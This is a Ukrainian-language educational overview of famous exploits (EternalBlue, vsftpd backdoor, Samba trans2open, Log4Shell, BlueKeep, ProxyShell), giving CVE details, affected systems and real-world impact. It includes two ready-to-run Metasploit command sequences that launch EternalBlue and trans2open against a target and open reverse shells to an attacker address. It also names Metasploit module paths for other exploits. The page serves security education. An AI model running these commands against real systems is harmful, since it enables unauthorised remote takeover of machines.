EternalBlue (MS17-010)

CVE-2017-0144 — найвідоміший експлойт останнього десятиліття

  • CVSS 9.8 (критична вразливість)
  • Протокол: SMBv1 (Server Message Block версія 1)
  • Вразливі системи: Windows XP, 7, 8.1, Server 2003–2008 R2
  • Тип: віддалене виконання коду без автентифікації
  • Використано в: WannaCry (травень 2017), NotPetya (червень 2017)
  • Витік: NSA (Shadow Brokers, квітень 2017)
# Експлуатація EternalBlue в Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
exploit
Реальний вплив WannaCry: 230,000+ заражених комп'ютерів у 150+ країнах за перший день (12 травня 2017). Збитки оцінюються в $4+ млрд. Постраждали: NHS (британська система охорони здоров'я), FedEx, Renault, Deutsche Bahn.

vsftpd 2.3.4 Backdoor

  • CVE-2011-2523 (бекдор у вихідному коді)

Samba trans2open

  • CVE-2003-0201
  • Тип: переповнення буфера
  • Вразливі версії: Samba < 2.2.8a
  • Вплив: віддалене виконання коду з правами root
  • Платформи: Linux, BSD, Solaris
# Експлуатація Samba trans2open
use exploit/linux/samba/trans2open
set RHOSTS 192.168.1.60
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 10.0.0.1
exploit

Log4Shell та інші сучасні експлойти

Log4Shell (CVE-2021-44228)

  • CVSS 10.0 (максимальна критичність)
  • Компонент: Apache Log4j 2.x (версії 2.0-beta9 до 2.14.1)
  • Тип: JNDI Injection → віддалене виконання коду
  • Вплив: мільйони Java-додатків (Minecraft, VMware, Apple iCloud, Tesla)
  • Виявлено: грудень 2021 (Alibaba Cloud Security Team)
  • MSF модуль: exploit/multi/http/log4shell_header_injection

BlueKeep (CVE-2019-0708)

  • CVSS 9.8
  • Протокол: RDP (Remote Desktop Protocol)
  • Тип: RCE без автентифікації (pre-auth)
  • Вразливі системи: Windows 7, Server 2008/2008 R2, XP
  • Потенціал: самопоширення (wormable)
  • MSF: exploit/windows/rdp/cve_2019_0708_bluekeep_rce

ProxyShell (Exchange)

  • CVE-2021-34473 (SSRF)
  • CVE-2021-34523 (Privilege Escalation)
  • CVE-2021-31207 (RCE)
  • Ланцюг атаки: SSRF → підвищення привілеїв → виконання коду
  • Цілі: Microsoft Exchange Server 2013–2019
  • Використано: для розгортання ransomware (LockFile, Conti)

Чому вивчати класичні експлойти? Розуміння принципів старих вразливостей дозволяє передбачати нові. EternalBlue використовував переповнення буфера — цей самий клас вразливості існує з 1980-х і досі актуальний. Log4Shell показав, як одна логічна помилка в популярній бібліотеці може поставити під загрозу мільйони систем. Вивчення кейсів — це аналіз шаблонів, а не просто запам'ятовування CVE-номерів.
